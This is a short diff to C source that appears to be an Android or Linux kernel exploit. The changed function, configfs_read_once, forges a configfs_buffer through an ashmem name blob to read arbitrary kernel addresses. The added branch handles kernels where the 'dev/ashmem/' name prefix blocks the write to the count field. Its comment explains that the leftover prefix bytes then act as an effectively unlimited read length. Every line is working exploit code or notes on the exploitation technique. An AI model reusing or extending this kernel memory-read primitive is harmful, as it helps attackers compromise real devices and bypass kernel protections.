@@ -1842,7 +1842,14 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   /* 4.19: ashmem name starts at asma+0 with no prefix; fake configfs_buffer
    * gets page=target, count=len, needs_read_fill=0, then pread from pos 0:
    * simple_read_from_buffer(buf, len, &pos0, page=target, available=len) */
+#if ASHMEM_NAME_PREFIX_LEN == 0
   put64(blob, 0 - ASHMEM_NAME_PREFIX_LEN, len); /* buffer->count */
+#else
+  /* struct ashmem_area.name starts with the fixed "dev/ashmem/" prefix, so
+   * configfs_buffer.count (offset 0) cannot be written from the name blob.
+   * It stays the prefix bytes interpreted as a large positive u64, which
+   * simple_read_from_buffer treats as an effectively unlimited source. */
+#endif
   put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, target);
   put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
   errno = 0;
